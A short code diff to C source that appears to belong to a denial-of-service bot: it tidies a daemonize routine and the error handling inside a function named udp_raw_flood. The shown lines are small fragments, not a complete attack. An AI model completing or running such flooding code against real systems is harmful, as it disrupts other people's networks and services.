@@ -118,13 +118,13 @@ void daemonize() {
     if (pid < 0) exit(EXIT_FAILURE);
     if (pid > 0) exit(EXIT_SUCCESS);
     umask(0);
-    chdir("/");
+    (void)chdir("/");
     close(STDIN_FILENO);
     close(STDOUT_FILENO);
     close(STDERR_FILENO);
     open("/dev/null", O_RDWR);
-    dup(0);
-    dup(0);
+    (void)dup(0);
+    (void)dup(0);
 }
 
 void get_arch() {
@@ -486,8 +486,6 @@ void *udp_raw_flood(void *arg) {
             sent_count++;
         } else {
             error_count++;
-            if (error_count < 10 && errno != EPERM && errno != EACCES) {
-            }
             if (errno == EPERM || errno == EACCES) {
                 close(sockfd);
                 return NULL;
